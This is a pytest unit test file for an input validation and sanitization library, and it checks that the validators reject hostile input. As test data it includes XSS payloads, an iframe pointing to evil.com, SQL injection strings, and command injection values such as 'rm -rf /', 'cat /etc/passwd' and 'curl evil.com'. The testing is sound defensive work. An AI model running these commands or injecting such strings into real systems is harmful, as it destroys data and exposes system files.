"""Comprehensive unit tests for input validation and sanitization."""

import pytest

from traigent.security.input_validation import (
    InputValidator,
    SanitizationHelper,
)
from traigent.utils.exceptions import ValidationError


class TestEmailValidation:
    """Test email validation."""

    def test_valid_email(self):
        """Test valid email addresses."""
        valid_emails = [
            "user@example.com",
            "john.doe@company.co.uk",
            "test+tag@example.com",
            "user123@test-domain.com",
        ]

        for email in valid_emails:
            result = InputValidator.validate_email(email)
            assert result == email.strip().lower()

    def test_invalid_email(self):
        """Test invalid email addresses."""
        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user @example.com",  # Space
            "user@.com",
            "",
            "user@domain",  # Missing TLD
        ]

        for email in invalid_emails:
            with pytest.raises(ValidationError):
                InputValidator.validate_email(email)

    def test_email_too_long(self):
        """Test email address that's too long."""
        long_email = "a" * 250 + "@test.com"
        with pytest.raises(ValidationError, match="too long"):
            InputValidator.validate_email(long_email)

    def test_email_normalization(self):
        """Test email normalization (lowercase, strip)."""
        email = "  UsEr@ExAmPlE.CoM  "
        result = InputValidator.validate_email(email)
        assert result == "user@example.com"

    def test_email_none_value(self):
        """Test email validation with None."""
        with pytest.raises(ValidationError, match="non-empty string"):
            InputValidator.validate_email(None)


class TestUsernameValidation:
    """Test username validation."""

    def test_valid_username(self):
        """Test valid usernames."""
        valid_usernames = [
            "user123",
            "john_doe",
            "test-user",
            "abc",
            "a" * 32,  # Maximum length
        ]

        for username in valid_usernames:
            result = InputValidator.validate_username(username)
            assert result == username.strip()

    def test_invalid_username(self):
        """Test invalid usernames."""
        invalid_usernames = [
            "ab",  # Too short
            "a" * 33,  # Too long
            "user@test",  # Invalid character
            "user name",  # Space
            "user!",  # Special character
            "",
            "123",  # Only numbers (but valid if alphanumeric is allowed)
        ]

        for username in invalid_usernames[:7]:  # Skip the last valid one
            with pytest.raises(ValidationError):
                InputValidator.validate_username(username)

    def test_username_none_value(self):
        """Test username validation with None."""
        with pytest.raises(ValidationError, match="non-empty string"):
            InputValidator.validate_username(None)


class TestPasswordValidation:
    """Test password validation."""

    def test_valid_password(self):
        """Test valid passwords."""
        valid_passwords = [
            "StrongP@ss123",
            "C0mpl3x!Pass",
            "MySecure#2024",
            "Test_Pass1$",
        ]

        for password in valid_passwords:
            InputValidator.validate_password(password)  # Should not raise

    def test_password_too_short(self):
        """Test password that's too short."""
        with pytest.raises(ValidationError, match="at least 8 characters"):
            InputValidator.validate_password("Short1!")

    def test_password_common(self):
        """Test common/weak passwords."""
        common_passwords = ["password", "12345678", "qwerty", "admin"]

        for password in common_passwords:
            with pytest.raises(ValidationError, match="too common"):
                InputValidator.validate_password(password)

    def test_password_insufficient_complexity(self):
        """Test password with insufficient complexity."""
        weak_passwords = [
            "alllowercase",  # Only lowercase
            "ALLUPPERCASE",  # Only uppercase
            "12345678901",  # Only digits
        ]

        for password in weak_passwords:
            with pytest.raises(ValidationError, match="at least 3 of"):
                InputValidator.validate_password(password)

    def test_password_custom_min_length(self):
        """Test password with custom minimum length."""
        with pytest.raises(ValidationError, match="at least 12 characters"):
            InputValidator.validate_password("Short1!", min_length=12)

    def test_password_none_value(self):
        """Test password validation with None."""
        with pytest.raises(ValidationError, match="non-empty string"):
            InputValidator.validate_password(None)


class TestURLValidation:
    """Test URL validation."""

    def test_valid_url(self):
        """Test valid URLs."""
        valid_urls = [
            "http://example.com",
            "https://www.example.com",
            "https://example.com/path/to/resource",
            "https://sub.example.co.uk/page?query=value",
        ]

        for url in valid_urls:
            result = InputValidator.validate_url(url)
            assert result == url.strip()

    def test_invalid_url_scheme(self):
        """Test URL with invalid scheme."""
        with pytest.raises(ValidationError, match="must use one of"):
            InputValidator.validate_url("ftp://example.com")

    def test_malicious_url_schemes(self):
        """Test URLs with potentially malicious schemes."""
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox",
        ]

        for url in malicious_urls:
            with pytest.raises(ValidationError, match="malicious"):
                InputValidator.validate_url(url)

    def test_url_custom_schemes(self):
        """Test URL validation with custom allowed schemes."""
        url = "ftp://files.example.com"
        result = InputValidator.validate_url(url, allowed_schemes=["ftp"])
        assert result == url

    def test_url_none_value(self):
        """Test URL validation with None."""
        with pytest.raises(ValidationError, match="non-empty string"):
            InputValidator.validate_url(None)


class TestHTMLSanitization:
    """Test HTML sanitization."""

    def test_sanitize_basic_html(self):
        """Test sanitizing basic HTML."""
        html = "<div>Hello World</div>"
        result = InputValidator.sanitize_html(html)
        assert "<" not in result or "&lt;" in result

    def test_sanitize_script_tags(self):
        """Test removing script tags."""
        html = "<script>alert('xss')</script>Hello"
        result = InputValidator.sanitize_html(html)
        assert "script" not in result.lower()
        assert "alert" not in result.lower()

    def test_sanitize_event_handlers(self):
        """Test removing event handlers."""
        html = '<div onclick="alert(1)">Click me</div>'
        result = InputValidator.sanitize_html(html)
        assert "onclick" not in result.lower()

    def test_sanitize_empty_html(self):
        """Test sanitizing empty HTML."""
        result = InputValidator.sanitize_html("")
        assert result == ""

    def test_sanitize_iframe(self):
        """Test removing iframe tags."""
        html = '<iframe src="http://evil.com"></iframe>'
        result = InputValidator.sanitize_html(html)
        assert "iframe" not in result.lower()


class TestSQLValidation:
    """Test SQL injection protection."""

    def test_safe_sql_input(self):
        """Test safe SQL input."""
        safe_inputs = [
            "John Doe",
            "test@example.com",
            "12345",
        ]

        for input_value in safe_inputs:
            result = InputValidator.validate_sql_input(input_value)
            assert isinstance(result, str)

    def test_sql_injection_detection(self):
        """Test SQL injection attempt detection."""
        injection_attempts = [
            "'; DROP TABLE users--",
            "1 OR 1=1",
            "admin' --",
            "1 UNION SELECT * FROM passwords",
            "'; EXEC sp_executesql",
        ]

        for attempt in injection_attempts:
            with pytest.raises(ValidationError, match="Invalid input"):
                InputValidator.validate_sql_input(attempt)

    def test_sql_quote_escaping(self):
        """Test that single quotes are escaped."""
        input_value = "O'Brien"
        result = InputValidator.validate_sql_input(input_value)
        assert "''" in result  # Single quote should be escaped


class TestCommandValidation:
    """Test command injection protection."""

    def test_safe_command_input(self):
        """Test safe command input."""
        safe_inputs = [
            "filename.txt",
            "user123",
            "test-file",
        ]

        for input_value in safe_inputs:
            result = InputValidator.validate_command_input(input_value)
            assert isinstance(result, str)

    def test_command_injection_detection(self):
        """Test command injection attempt detection."""
        injection_attempts = [
            "file.txt; rm -rf /",
            "test | cat /etc/passwd",
            "file && curl evil.com",
            "test`whoami`",
            "file$(cat /etc/passwd)",
        ]

        for attempt in injection_attempts:
            with pytest.raises(ValidationError, match="Invalid input"):
                InputValidator.validate_command_input(attempt)


class TestNumericValidation:
    """Test numeric validation."""

    def test_valid_numeric(self):
        """Test valid numeric values."""
        assert InputValidator.validate_numeric("123") == 123.0
        assert InputValidator.validate_numeric(123.45) == 123.45
        assert InputValidator.validate_numeric(-10) == -10.0

    def test_numeric_with_bounds(self):
        """Test numeric validation with min/max bounds."""
        result = InputValidator.validate_numeric(50, min_value=0, max_value=100)
        assert result == 50.0

    def test_numeric_below_minimum(self):
        """Test numeric value below minimum."""
        with pytest.raises(ValidationError, match="must be >= 0"):
            InputValidator.validate_numeric(-5, min_value=0)

    def test_numeric_above_maximum(self):
        """Test numeric value above maximum."""
        with pytest.raises(ValidationError, match="must be <= 100"):
            InputValidator.validate_numeric(150, max_value=100)

    def test_invalid_numeric(self):
        """Test invalid numeric values."""
        with pytest.raises(ValidationError, match="must be numeric"):
            InputValidator.validate_numeric("not-a-number")


class TestIntegerValidation:
    """Test integer validation."""

    def test_valid_integer(self):
        """Test valid integer values."""
        assert InputValidator.validate_integer("123") == 123
        assert InputValidator.validate_integer(456) == 456
        assert InputValidator.validate_integer(-10) == -10

    def test_integer_with_bounds(self):
        """Test integer validation with min/max bounds."""
        result = InputValidator.validate_integer(50, min_value=0, max_value=100)
        assert result == 50

    def test_integer_from_float(self):
        """Test converting float to integer."""
        result = InputValidator.validate_integer(123.7)
        assert result == 123
        assert isinstance(result, int)

    def test_invalid_integer(self):
        """Test invalid integer values."""
        with pytest.raises(ValidationError, match="must be an integer"):
            InputValidator.validate_integer("not-an-int")


class TestFilenameValidation:
    """Test filename validation."""

    def test_valid_filename(self):
        """Test valid filenames."""
        valid_filenames = [
            "document.pdf",
            "image.jpg",
            "data_file.csv",
            "report-2024.txt",
        ]

        for filename in valid_filenames:
            result = InputValidator.validate_filename(filename)
            assert result == filename

    def test_directory_traversal_attempt(self):
        """Test directory traversal attack prevention."""
        with pytest.raises(ValidationError, match="Invalid filename"):
            InputValidator.validate_filename("../../etc/passwd")

    def test_path_components_removed(self):
        """Test path components are removed."""
        result = InputValidator.validate_filename("/path/to/file.txt")
        assert "/" not in result
        assert result == "pathtofile.txt"

    def test_filename_too_long(self):
        """Test filename that's too long."""
        long_filename = "a" * 300 + ".txt"
        with pytest.raises(ValidationError, match="too long"):
            InputValidator.validate_filename(long_filename)

    def test_invalid_filename_characters(self):
        """Test filename with invalid characters."""
        with pytest.raises(ValidationError):
            InputValidator.validate_filename("file name.txt")  # Space not allowed


class TestJSONValidation:
    """Test JSON input validation."""

    def test_valid_json_input(self):
        """Test valid JSON input validation."""
        schema = {
            "name": {"type": "string", "required": True},
            "age": {"type": "integer", "required": False},
            "active": {"type": "boolean"},
        }

        data = {"name": "John", "age": 30, "active": True}
        result = InputValidator.validate_json_input(data, schema)

        assert result["name"] == "John"
        assert result["age"] == 30
        assert result["active"] is True

    def test_missing_required_field(self):
        """Test validation with missing required field."""
        schema = {"name": {"type": "string", "required": True}}

        with pytest.raises(ValidationError, match="required"):
            InputValidator.validate_json_input({}, schema)

    def test_wrong_type(self):
        """Test validation with wrong type."""
        schema = {"age": {"type": "integer"}}

        with pytest.raises(ValidationError, match="must be an integer"):
            InputValidator.validate_json_input({"age": "not-an-int"}, schema)

    def test_custom_validator(self):
        """Test custom field validator."""

        def validate_positive(value):
            if value <= 0:
                raise ValidationError("Must be positive")
            return value

        schema = {"count": {"type": "integer", "validator": validate_positive}}

        with pytest.raises(ValidationError, match="Must be positive"):
            InputValidator.validate_json_input({"count": -5}, schema)


class TestSanitizationHelper:
    """Test sanitization helper functions."""

    def test_remove_null_bytes(self):
        """Test removing null bytes."""
        result = SanitizationHelper.remove_null_bytes("test\x00data")
        assert "\x00" not in result
        assert result == "testdata"

    def test_normalize_whitespace(self):
        """Test normalizing whitespace."""
        result = SanitizationHelper.normalize_whitespace("  multiple   spaces  ")
        assert result == "multiple spaces"

    def test_strip_control_chars(self):
        """Test stripping control characters."""
        result = SanitizationHelper.strip_control_chars("test\x01\x02data\x7f")
        assert result == "testdata"

    def test_truncate(self):
        """Test truncating strings."""
        result = SanitizationHelper.truncate("long string here", max_length=10)
        assert result == "long strin"
        assert len(result) == 10

    def test_truncate_short_string(self):
        """Test truncating string shorter than max length."""
        result = SanitizationHelper.truncate("short", max_length=100)
        assert result == "short"


class TestEdgeCases:
    """Test edge cases and special scenarios."""

    def test_unicode_handling(self):
        """Test handling of unicode characters."""
        unicode_text = "Hello 世界 🌍"
        result = InputValidator.sanitize_html(unicode_text)
        assert isinstance(result, str)

    def test_empty_string_handling(self):
        """Test handling of empty strings."""
        assert InputValidator.sanitize_html("") == ""
        assert InputValidator.validate_sql_input("") == ""
        assert InputValidator.validate_command_input("") == ""

    def test_very_long_input(self):
        """Test handling of very long input."""
        long_input = "a" * 100000
        result = SanitizationHelper.truncate(long_input, max_length=1000)
        assert len(result) == 1000

    def test_mixed_injection_attempts(self):
        """Test input with multiple injection types."""
        malicious_input = "'; <script>alert(1)</script> && rm -rf /"

        # Should fail SQL validation
        with pytest.raises(ValidationError):
            InputValidator.validate_sql_input(malicious_input)

        # Should fail command validation
        with pytest.raises(ValidationError):
            InputValidator.validate_command_input(malicious_input)

        # Should sanitize in HTML context
        result = InputValidator.sanitize_html(malicious_input)
        assert "script" not in result.lower()
